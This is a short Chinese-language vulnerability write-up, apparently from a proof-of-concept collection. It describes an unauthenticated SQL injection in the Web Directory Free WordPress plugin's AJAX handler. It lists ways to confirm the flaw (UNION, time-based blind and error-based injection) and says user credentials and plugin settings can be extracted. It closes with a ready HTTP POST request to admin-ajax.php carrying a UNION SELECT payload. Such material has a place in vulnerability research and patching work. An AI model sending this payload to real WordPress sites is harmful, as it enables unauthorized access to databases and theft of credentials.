验证漏洞存在方法
    - 发送包含SQL注入payload的HTTP请求到目标网站的AJAX端点
    - 观察响应中是否包含数据库错误信息或异常延迟
    - 使用UNION注入测试是否可以提取数据库信息

漏洞利用方法
    - 该漏洞存在于Web Directory Free WordPress插件的AJAX操作中，未认证的用户可以通过构造特定的SQL注入payload来执行恶意SQL语句
    - 漏洞支持多种注入技术：UNION注入、时间盲注和错误盲注
    - 攻击者可以利用此漏洞提取数据库中的敏感信息，包括用户凭证、插件配置等

PoC
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

action=web_directory_free_action&param=1' UNION SELECT 1,2,3-- -
```
